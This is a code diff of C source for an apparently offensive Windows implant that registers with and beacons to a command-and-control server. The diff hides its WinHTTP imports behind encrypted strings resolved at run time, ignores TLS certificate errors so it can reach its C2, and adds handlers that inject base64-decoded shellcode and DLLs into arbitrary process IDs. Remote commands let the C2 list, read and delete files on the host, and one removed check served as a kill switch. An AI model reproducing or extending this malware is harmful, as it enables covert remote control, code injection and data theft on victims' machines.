@@ -13,9 +13,11 @@
 
 #include "../lib/json-c/json.h"
 
-// local 
+// local
 
 #include "base64.h"
+#include "imports.h"
+#include "strings.h"
 #include "compression.h"
 
 // core header file
@@ -26,13 +28,14 @@
 
 #include "settings.h"
 
+// Include stdlib function prototypes
+#include "../lib/stdlib/stdlib.h"
+
 // core functions
 BOOL GetBasicUserInfo(struct BasicUserInfo *UserInfo)
 {
 
     /* get basic infomation about how the current user is running */
-
-    #define INFO_BUFFER_SIZE 32767
 
     DWORD dwUserBuf = 256;
     char chCurrentUser[256];
@@ -54,7 +57,7 @@ BOOL GetBasicUserInfo(struct BasicUserInfo *UserInfo)
     {
         UserInfo->DomainName = "NULL";
     }
-    
+
     // set the computer name
 
     GetComputerNameA( ComputerBuf, &bufSize3 );
@@ -121,28 +124,8 @@ BOOL GetBasicCompInfo(struct BasicCompInfo *CompInfo)
         CompInfo->OS = "Windows Server 2012";
         return;
     }
-    
+
     CompInfo->OS = "Windows";
-
-}
-
-LPVOID CheckIfDie(LPCWSTR *ReadBuffer)
-{   
-
-    // get the 'alive' parameter of the json data and if its false... die
-
-    struct json_object *parsed_json;
-
-    parsed_json = json_tokener_parse(ReadBuffer);
-    parsed_json = json_object_object_get(parsed_json, "alive");
-    
-    if (parsed_json != NULL)
-    {
-        if (!json_object_get_boolean(parsed_json))
-        {
-            DieCleanly();
-        }
-    }
 
 }
 
@@ -164,59 +147,126 @@ BOOL BeaconRegisterC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserAgent
     CHAR                ReadBuffer[dwSize + 1];
     DWORD               dwDownloaded = 0;
     HINTERNET           hSession = NULL, hConnect = NULL, hRequest = NULL;
+    HMODULE             hWinHTTPdll;
+    char*               tmp_decrypted_str;
     struct json_object *parsed_json;
 
-    // initiate the session
+    // create all references to dll functions
+    // Load WinHTTP.dll
+    tmp_decrypted_str = decrypt_string(STRING_WINHTTP_DLL, STRING_WINHTTP_DLL_KEY);
+    hWinHTTPdll = LoadLibrary(tmp_decrypted_str);
+    free(tmp_decrypted_str);
 
-    hSession = WinHttpOpen((LPCWSTR)UserAgent, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+    // Create WinHttpCloseHandle reference
+    tmp_decrypted_str = decrypt_string(STRING_WINHTTP_CLOSEH, STRING_WINHTTP_CLOSEH_KEY);
+    WinHttpCloseHandle_ rWinHttpCloseHandle = (WinHttpCloseHandle_)GetProcAddress(hWinHTTPdll, tmp_decrypted_str);
+    free(tmp_decrypted_str);
+
+    // Create WinHttpOpen reference
+    tmp_decrypted_str = decrypt_string(STRING_WINHTTP_OPEN, STRING_WINHTTP_OPEN_KEY);
+    WinHttpOpen_ rWinHttpOpen = (WinHttpOpen_)GetProcAddress(hWinHTTPdll, tmp_decrypted_str);
+    free(tmp_decrypted_str);
+
+    // Create WinHttpConnect reference
+    tmp_decrypted_str = decrypt_string(STRING_WINHTTP_CONNECT, STRING_WINHTTP_CONNECT_KEY);
+    WinHttpConnect_ rWinHttpConnect = (WinHttpConnect_)GetProcAddress(hWinHTTPdll, tmp_decrypted_str);
+    free(tmp_decrypted_str);
+
+    // Create WinHttpOpenRequest reference
+    tmp_decrypted_str = decrypt_string(STRING_WINHTTP_OPENREQ, STRING_WINHTTP_OPENREQ_KEY);
+    WinHttpOpenRequest_ rWinHttpOpenRequest = (WinHttpOpenRequest_)GetProcAddress(hWinHTTPdll, tmp_decrypted_str);
+    free(tmp_decrypted_str);
+
+    // Create WinHttpSetOption reference
+    tmp_decrypted_str = decrypt_string(STRING_WINHTTP_SETOPT, STRING_WINHTTP_SETOPT_KEY);
+    WinHttpSetOption_ rWinHttpSetOption = (WinHttpSetOption_)GetProcAddress(hWinHTTPdll, tmp_decrypted_str);
+    free(tmp_decrypted_str);
+
+    // Create WinHttpSendRequest reference
+    tmp_decrypted_str = decrypt_string(STRING_WINHTTP_SENDREQ, STRING_WINHTTP_SENDREQ_KEY);
+    WinHttpSendRequest_ rWinHttpSendRequest = (WinHttpSendRequest_)GetProcAddress(hWinHTTPdll, tmp_decrypted_str);
+    free(tmp_decrypted_str);
+
+    // Create WinHttpReceiveResponse reference
+    tmp_decrypted_str = decrypt_string(STRING_WINHTTP_RECVRES, STRING_WINHTTP_RECVRES_KEY);
+    WinHttpReceiveResponse_ rWinHttpReceiveResponse = (WinHttpReceiveResponse_)GetProcAddress(hWinHTTPdll, tmp_decrypted_str);
+    free(tmp_decrypted_str);
+
+    // Create WinHttpQueryDataAvailable reference
+    tmp_decrypted_str = decrypt_string(STRING_WINHTTP_DATAAVA, STRING_WINHTTP_DATAAVA_KEY);
+    WinHttpQueryDataAvailable_ rWinHttpQueryDataAvailable = (WinHttpQueryDataAvailable_)GetProcAddress(hWinHTTPdll, tmp_decrypted_str);
+    free(tmp_decrypted_str);
+
+    // Create WinHttpReadData reference
+    tmp_decrypted_str = decrypt_string(STRING_WINHTTP_READATA, STRING_WINHTTP_READATA_KEY);
+    WinHttpReadData_ rWinHttpReadData = (WinHttpReadData_)GetProcAddress(hWinHTTPdll, tmp_decrypted_str);
+    free(tmp_decrypted_str);
+
+    // init the connection
+    hSession = rWinHttpOpen((LPCWSTR)UserAgent, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
 
     if (!hSession)
     {
         // not really alot we can do about this, guess we just return and try again later...
+        DEBUG("FAILED: WinHttpOpen, GetLastError(): %d", GetLastError());
         return FALSE;
     }
 
     // do the connection
-    hConnect = WinHttpConnect(hSession, (LPCWSTR)CallbackAddress, CallbackPort, 0);
+    hConnect = rWinHttpConnect(hSession, (LPCWSTR)CallbackAddress, CallbackPort, 0);
 
     if (!hConnect)
     {
-        // again, we cant do nothin so just go again later
+        rWinHttpCloseHandle(hSession);
+
+        DEBUG("FAILED: WinHttpConnect, GetLastError(): %d", GetLastError());
+
         return FALSE;
     }
 
     // set up the request
-    hRequest = WinHttpOpenRequest(hConnect, L"POST", _REGISTER_URL, NULL, NULL, NULL, WINHTTP_FLAG_BYPASS_PROXY_CACHE | WINHTTP_FLAG_SECURE);
+
+    hRequest = rWinHttpOpenRequest(hConnect, L"POST", _REGISTER_URL, NULL, NULL, NULL, WINHTTP_FLAG_BYPASS_PROXY_CACHE | WINHTTP_FLAG_SECURE);
 
     if (!hRequest)
     {
-        // you get the idea by now
+        rWinHttpCloseHandle(hSession);
+        rWinHttpCloseHandle(hConnect);
+
+        DEBUG("FAILED: WinHttpOpenRequest, GetLastError(): %d", GetLastError());
+
         return FALSE;
     }
 
     // set the flags for our request, basically so we can connect when the c2 ssl cert is fucked
     flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
 
-    if (!WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags)))
+    if (!rWinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags)))
     {
-        // guess what...
+        rWinHttpCloseHandle(hRequest);
+        rWinHttpCloseHandle(hSession);
+        rWinHttpCloseHandle(hConnect);
+
+        DEBUG("FAILED: WinHttpSetOption, GetLastError(): %d", GetLastError());
+
         return FALSE;
     }
 
     // finally send the actual request to the c2
-    bResults = WinHttpSendRequest(hRequest, _POST_HEADER, _HEADER_LEN, (LPVOID)UriBuffer, strlen((char*)UriBuffer), strlen((char*)UriBuffer), 0);
+
+    bResults = rWinHttpSendRequest(hRequest, _POST_HEADER, _HEADER_LEN, (LPVOID)UriBuffer, strlen((char*)UriBuffer), strlen((char*)UriBuffer), 0);
 
     // make sure the request was successful
     if (bResults)
-    {    
-        bResults = WinHttpReceiveResponse(hRequest, NULL);
+    {
+        bResults = rWinHttpReceiveResponse(hRequest, NULL);
     } else {
         if (GetLastError() & ERROR_WINHTTP_SECURE_FAILURE)
         {
-            DEBUG("Failed to make callback");
+            DEBUG("FAILED: WinHttpSendRequest (ERROR_WINHTTP_SECURE_FAILURE)");
         }
-        
-        DEBUG("WinHttpSendRequest error: %d\n", GetLastError());
+
+        DEBUG("FAILED: WinHttpSendRequest, GetLastError(): %d", GetLastError());
     }
 
     // no lets get the session id
@@ -224,30 +274,28 @@ BOOL BeaconRegisterC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserAgent
     {
         do
         {
-            
-            if (!WinHttpQueryDataAvailable( hRequest, &dwSize))
+            if (!rWinHttpQueryDataAvailable( hRequest, &dwSize))
             {
                 // Theres no data avalible
-                DEBUG("WinHttpQueryDataAvailable error\n");
+                DEBUG("FAILED: WinHttpQueryDataAvailable, GetLastError(): %d", GetLastError());
                 return FALSE;
             }
 
-            if (!WinHttpReadData( hRequest, (LPVOID)ReadBuffer, dwSize, &dwDownloaded))
-            {                                  
+            if (!rWinHttpReadData( hRequest, (LPVOID)ReadBuffer, dwSize, &dwDownloaded))
+            {
                 // been an error
-                DEBUG("WinHttpReadData error\n");
+                DEBUG("FAILED: WinHttpReadData, GetLastError(): %d", GetLastError());
                 return FALSE;
             }
 
         } while (dwSize > 0);
-        
+
     }
 
     // clean up the request stuffs now we are done with it.
-
-    WinHttpCloseHandle(hRequest);
-    WinHttpCloseHandle(hConnect);
-    WinHttpCloseHandle(hSession);
+    rWinHttpCloseHandle(hRequest);
+    rWinHttpCloseHandle(hSession);
+    rWinHttpCloseHandle(hConnect);
 
     // now its time to parse the json data in the responce
     parsed_json = json_tokener_parse(ReadBuffer);
@@ -256,9 +304,10 @@ BOOL BeaconRegisterC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserAgent
     parsed_json = json_object_object_get(parsed_json, "id");
     strcpy(IdBuffer, json_object_get_string(parsed_json));
 
-    // now check we dont need to kill ourselves
-    CheckIfDie(&ReadBuffer);
-
+    // Decrement json object reference count
+    json_object_put(parsed_json);
+    // Free WinHTTP.dll
+    FreeLibrary(hWinHTTPdll);
     return TRUE;
 }
 
@@ -267,7 +316,7 @@ LPCSTR* BuildCheckinData(DWORD OpCode, LPCSTR Data, DWORD Mode)
     /*
     Build the reply to the C2 containing any data we need to send back
     */
-
+    LPCSTR *beaconCheckinData;
     struct json_object *jobj;
 
     // init the json object
@@ -280,10 +329,10 @@ LPCSTR* BuildCheckinData(DWORD OpCode, LPCSTR Data, DWORD Mode)
     switch (Mode)
     {
     case MODE_CHECKIN_NO_DATA:
-    
-        // dont add any data  
+
+        // dont add any data
         break;
-    
+
     case MODE_CHECKIN_DATA:
 
         // add the opcode and data to the json data
@@ -291,13 +340,15 @@ LPCSTR* BuildCheckinData(DWORD OpCode, LPCSTR Data, DWORD Mode)
         json_object_object_add(jobj, "data", json_object_new_string(Data));
 
         break;
-    
+
     default:
         break;
     }
 
     // return the formated data
-    return (LPCSTR*)json_object_to_json_string_ext(jobj, JSON_C_TO_STRING_PLAIN);
+    beaconCheckinData = (LPCSTR *) _strdup(json_object_to_json_string_ext(jobj, JSON_C_TO_STRING_PLAIN));
+    json_object_put(jobj);
+    return beaconCheckinData;
 }
 
 LPCWSTR* BeaconCallbackC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserAgent, DWORD *OpCode, LPCSTR SendBuffer, DWORD SendOpCode, DWORD SendBufferSize)
@@ -312,21 +363,66 @@ LPCWSTR* BeaconCallbackC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserA
     HINTERNET           hSession = NULL, hConnect = NULL, hRequest = NULL;
     LPCSTR*             UriBuffer;
     DWORD               flags;
+    HMODULE             hWinHTTPdll;
+    char*               tmp_decrypted_str;
 
     struct json_object *parsed_json;
+    struct json_object *parsed_json_task;
+    struct json_object *parsed_json_args;
 
-    // check if we doing a normal checkin or sending data
 
-    if (SendBuffer == NULL && SendOpCode == NULL)
-    {
-        UriBuffer = (LPCSTR*)malloc(5000);
-    } else {
-        UriBuffer = (LPCSTR*)malloc(SendBufferSize * 2);
-    }
+    // create all references to dll functions
+    // Load WinHTTP.dll
+    tmp_decrypted_str = decrypt_string(STRING_WINHTTP_DLL, STRING_WINHTTP_DLL_KEY);
+    hWinHTTPdll = LoadLibrary(tmp_decrypted_str);
+    free(tmp_decrypted_str);
 
-    // initiate the session
+    // Create WinHttpCloseHandle reference
+    tmp_decrypted_str = decrypt_string(STRING_WINHTTP_CLOSEH, STRING_WINHTTP_CLOSEH_KEY);
+    WinHttpCloseHandle_ rWinHttpCloseHandle = (WinHttpCloseHandle_)GetProcAddress(hWinHTTPdll, tmp_decrypted_str);
+    free(tmp_decrypted_str);
 
-    hSession = WinHttpOpen((LPCWSTR)UserAgent, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+    // Create WinHttpOpen reference
+    tmp_decrypted_str = decrypt_string(STRING_WINHTTP_OPEN, STRING_WINHTTP_OPEN_KEY);
+    WinHttpOpen_ rWinHttpOpen = (WinHttpOpen_)GetProcAddress(hWinHTTPdll, tmp_decrypted_str);
+    free(tmp_decrypted_str);
+
+    // Create WinHttpConnect reference
+    tmp_decrypted_str = decrypt_string(STRING_WINHTTP_CONNECT, STRING_WINHTTP_CONNECT_KEY);
+    WinHttpConnect_ rWinHttpConnect = (WinHttpConnect_)GetProcAddress(hWinHTTPdll, tmp_decrypted_str);
+    free(tmp_decrypted_str);
+
+    // Create WinHttpOpenRequest reference
+    tmp_decrypted_str = decrypt_string(STRING_WINHTTP_OPENREQ, STRING_WINHTTP_OPENREQ_KEY);
+    WinHttpOpenRequest_ rWinHttpOpenRequest = (WinHttpOpenRequest_)GetProcAddress(hWinHTTPdll, tmp_decrypted_str);
+    free(tmp_decrypted_str);
+
+    // Create WinHttpSetOption reference
+    tmp_decrypted_str = decrypt_string(STRING_WINHTTP_SETOPT, STRING_WINHTTP_SETOPT_KEY);
+    WinHttpSetOption_ rWinHttpSetOption = (WinHttpSetOption_)GetProcAddress(hWinHTTPdll, tmp_decrypted_str);
+    free(tmp_decrypted_str);
+
+    // Create WinHttpSendRequest reference
+    tmp_decrypted_str = decrypt_string(STRING_WINHTTP_SENDREQ, STRING_WINHTTP_SENDREQ_KEY);
+    WinHttpSendRequest_ rWinHttpSendRequest = (WinHttpSendRequest_)GetProcAddress(hWinHTTPdll, tmp_decrypted_str);
+    free(tmp_decrypted_str);
+
+    // Create WinHttpReceiveResponse reference
+    tmp_decrypted_str = decrypt_string(STRING_WINHTTP_RECVRES, STRING_WINHTTP_RECVRES_KEY);
+    WinHttpReceiveResponse_ rWinHttpReceiveResponse = (WinHttpReceiveResponse_)GetProcAddress(hWinHTTPdll, tmp_decrypted_str);
+    free(tmp_decrypted_str);
+
+    // Create WinHttpQueryDataAvailable reference
+    tmp_decrypted_str = decrypt_string(STRING_WINHTTP_DATAAVA, STRING_WINHTTP_DATAAVA_KEY);
+    WinHttpQueryDataAvailable_ rWinHttpQueryDataAvailable = (WinHttpQueryDataAvailable_)GetProcAddress(hWinHTTPdll, tmp_decrypted_str);
+    free(tmp_decrypted_str);
+
+    // Create WinHttpReadData reference
+    tmp_decrypted_str = decrypt_string(STRING_WINHTTP_READATA, STRING_WINHTTP_READATA_KEY);
+    WinHttpReadData_ rWinHttpReadData = (WinHttpReadData_)GetProcAddress(hWinHTTPdll, tmp_decrypted_str);
+    free(tmp_decrypted_str);
+
+    hSession = rWinHttpOpen((LPCWSTR)UserAgent, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
 
     if (!hSession)
     {
@@ -335,22 +431,24 @@ LPCWSTR* BeaconCallbackC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserA
     }
 
     // do the connection
-
-    hConnect = WinHttpConnect(hSession, (LPCWSTR)CallbackAddress, CallbackPort, 0);
+    hConnect = rWinHttpConnect(hSession, (LPCWSTR)CallbackAddress, CallbackPort, 0);
 
     if (!hConnect)
     {
-        // again, we cant do nothin so just go again later
+        rWinHttpCloseHandle(hSession);
+
         return FALSE;
     }
 
     // set up the request
 
-    hRequest = WinHttpOpenRequest(hConnect, L"POST", _CALLBACK_URL, NULL, NULL, NULL, WINHTTP_FLAG_BYPASS_PROXY_CACHE | WINHTTP_FLAG_SECURE);
+    hRequest = rWinHttpOpenRequest(hConnect, L"POST", _CALLBACK_URL, NULL, NULL, NULL, WINHTTP_FLAG_BYPASS_PROXY_CACHE | WINHTTP_FLAG_SECURE);
 
     if (!hRequest)
     {
-        // you get the idea by now
+        rWinHttpCloseHandle(hSession);
+        rWinHttpCloseHandle(hConnect);
+
         return FALSE;
     }
 
@@ -358,15 +456,16 @@ LPCWSTR* BeaconCallbackC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserA
 
     flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
 
-    if (!WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags)))
+    if (!rWinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags)))
     {
-        // guess what...
+        rWinHttpCloseHandle(hRequest);
+        rWinHttpCloseHandle(hSession);
+        rWinHttpCloseHandle(hConnect);
+
         return FALSE;
     }
 
     // build the data for the request
-
-    memset(UriBuffer, '\0', strlen(UriBuffer));
 
     if (SendOpCode != NULL)
     {
@@ -377,34 +476,38 @@ LPCWSTR* BeaconCallbackC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserA
 
     // finally send the actual request to the c2
 
-    bResults = WinHttpSendRequest(hRequest, _POST_HEADER, _HEADER_LEN, (LPVOID)UriBuffer, strlen((char*)UriBuffer), strlen((char*)UriBuffer), 0);
+    bResults = rWinHttpSendRequest(hRequest, _POST_HEADER, _HEADER_LEN, (LPVOID)UriBuffer, strlen((char*)UriBuffer), strlen((char*)UriBuffer), 0);
+    free(UriBuffer);
 
     // make sure the request was successful
 
     if (bResults)
-    {       
-        bResults = WinHttpReceiveResponse(hRequest, NULL);
+    {
+        bResults = rWinHttpReceiveResponse(hRequest, NULL);
     }
 
     if (bResults)
-    {  
+    {
         DWORD dwSize = 0;
         DWORD dwDownloaded = 0;
         LPSTR pszOutBuffer;
 
         ResBuffer = "";
+        char* tmp;
 
-        do 
+        do
         {
+
             // check how much available data there is
 
             dwSize = 0;
-            if (!WinHttpQueryDataAvailable( hRequest, &dwSize)) 
+
+            if (!rWinHttpQueryDataAvailable( hRequest, &dwSize))
             {
                 DEBUG( "Error %u in WinHttpQueryDataAvailable.\n", GetLastError());
                 break;
             }
-            
+
             // out of data
 
             if (!dwSize)
@@ -421,69 +524,109 @@ LPCWSTR* BeaconCallbackC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserA
                 DEBUG("Out of memory\n");
                 break;
             }
-            
+
             // read all the data
 
             ZeroMemory(pszOutBuffer, dwSize + 1);
 
-            if (!WinHttpReadData( hRequest, (LPVOID)pszOutBuffer, dwSize, &dwDownloaded))
-            {                                  
+            if (!rWinHttpReadData( hRequest, (LPVOID)pszOutBuffer, dwSize, &dwDownloaded))
+            {
                 // been an error
                 return FALSE;
             }
             else
             {
+                // TODO: test if this is leaking memory.
                 asprintf(&ResBuffer, "%s%s", ResBuffer, pszOutBuffer);
             }
-        
+
             // free the memory allocated to the buffer.
 
             free(pszOutBuffer);
-                
+
         } while (dwSize > 0);
     }
 
-    // check if we need to die
-    CheckIfDie(ResBuffer);
-
     // get the opcode
     parsed_json = json_tokener_parse(ResBuffer);
-    parsed_json = json_object_object_get(parsed_json, "task");
-    *OpCode     = json_object_get_int(parsed_json);
+    parsed_json_task = json_object_object_get(parsed_json, "task");
+    *OpCode     = json_object_get_int(parsed_json_task);
 
-    parsed_json = json_tokener_parse(ResBuffer);
-    parsed_json = json_object_object_get(parsed_json, "args");
+    parsed_json_args = json_object_object_get(parsed_json, "args");
+    LPCSTR *argsBuffer = NULL;
     if (parsed_json != NULL)
     {
-        return json_object_get_string(parsed_json);
+        // Copy args json string into return buffer
+        argsBuffer = (LPCSTR *) _strdup(json_object_get_string(parsed_json_args));
     }
-
-    return NULL;
+    // Free ResBuffer json object
+    json_object_put(parsed_json);
+    // Cleanup handles
+    rWinHttpCloseHandle(hRequest);
+    rWinHttpCloseHandle(hSession);
+    rWinHttpCloseHandle(hConnect);
+    return argsBuffer;
 }
 
-BOOL ExecuteCode(char* Base64Buffer, BOOL CodeType)
+BOOL SpawnExecuteCode(char* Base64Buffer)
 {
     size_t out_len   = strlen(Base64Buffer) + 1;
     size_t b64_len   = b64_decoded_size(Base64Buffer);
     char*  b64_out   = (char*)malloc(out_len);
 
-    b64_out = base64_decode((const char*)Base64Buffer, out_len - 1, &out_len);    
+    b64_out = base64_decode((const char*)Base64Buffer, out_len - 1, &out_len);
 
-    DEBUG("Calling ExecuteMemory");
+    return SpawnCode(b64_out, b64_len);
+}
 
-    switch (CodeType)
-    {
-    case TRUE:
-        // execute module
-        return ExecuteMemory(b64_out, b64_len, TRUE);
-    
-    case FALSE:
-        // execute arbitary user code
-        return ExecuteMemory(b64_out, b64_len, FALSE);
-    
-    default:
-        return FALSE;
-    }
+BOOL InjectExecuteCode(char* Buffer)
+{
+    struct json_object *parsed_json;
+
+    // get pid to inject into
+    parsed_json = json_tokener_parse(Buffer);
+    parsed_json = json_object_object_get(parsed_json, "pid");
+    int pid = json_object_get_int(parsed_json);
+
+    // get the base64 data to inject
+    parsed_json = json_tokener_parse(Buffer);
+    parsed_json = json_object_object_get(parsed_json, "data");
+    char* data = json_object_get_string(parsed_json);
+
+    // decode that base64 data
+    size_t out_len   = strlen(data) + 1;
+    size_t b64_len   = b64_decoded_size(data);
+    char*  b64_out   = (char*)malloc(out_len);
+
+    b64_out = base64_decode((const char*)data, out_len - 1, &out_len);
+
+    // inject the code
+    return InjectCode(b64_out, b64_len, pid);
+}
+
+BOOL InjectExecuteDll(char* Buffer)
+{
+    struct json_object *parsed_json;
+
+    // get pid to inject into
+    parsed_json = json_tokener_parse(Buffer);
+    parsed_json = json_object_object_get(parsed_json, "pid");
+    int pid = json_object_get_int(parsed_json);
+
+    // get the base64 dll to inject
+    parsed_json = json_tokener_parse(Buffer);
+    parsed_json = json_object_object_get(parsed_json, "dll");
+    char* data = json_object_get_string(parsed_json);
+
+    // decode that base64 dll
+    size_t out_len   = strlen(data) + 1;
+    size_t b64_len   = b64_decoded_size(data);
+    char*  b64_out   = (char*)malloc(out_len);
+
+    b64_out = base64_decode((const char*)data, out_len - 1, &out_len);
+
+    // inject the code
+    return InjectDLL(b64_out, b64_len, pid);
 }
 
 BOOL Stdlib(char* Buffer)
@@ -491,7 +634,7 @@ BOOL Stdlib(char* Buffer)
     char* data = NULL;
     DWORD rOpCode;
     struct json_object *parsed_json;
-    
+
     parsed_json = json_tokener_parse(Buffer);
     parsed_json = json_object_object_get(parsed_json, "op");
     int op = json_object_get_int(parsed_json);
@@ -506,39 +649,33 @@ BOOL Stdlib(char* Buffer)
     case 0x1000:
         data = listdirs(args);
         break;
-    
+
     case 0x2000:
         data = readfile(args);
         break;
-    
+
     case 0x3000:
         data = getdir();
         break;
-    
+
     case 0x4000:
         data = removefile(args);
         break;
-    
+
     case 0x5000:
         data = makedirectory(args);
         break;
-    
+
     case 0x6000:
         data = changedir(args);
         break;
-    
-    // I have no idea why this doesnt work.
-    // case 0x7000:
-    //     // rewrite
-    //     if (strlen(args) == 0)
-    //     {
-    //         data = whoami(FALSE);
-    //     } else {
-    //         data = whoami(TRUE);
-    //     }
-    //     break;
+
+    case 0x7000:
+        data = getpid();
+        break;
 
     case 0x8000:
+        data = getps();
         break;
     }
 
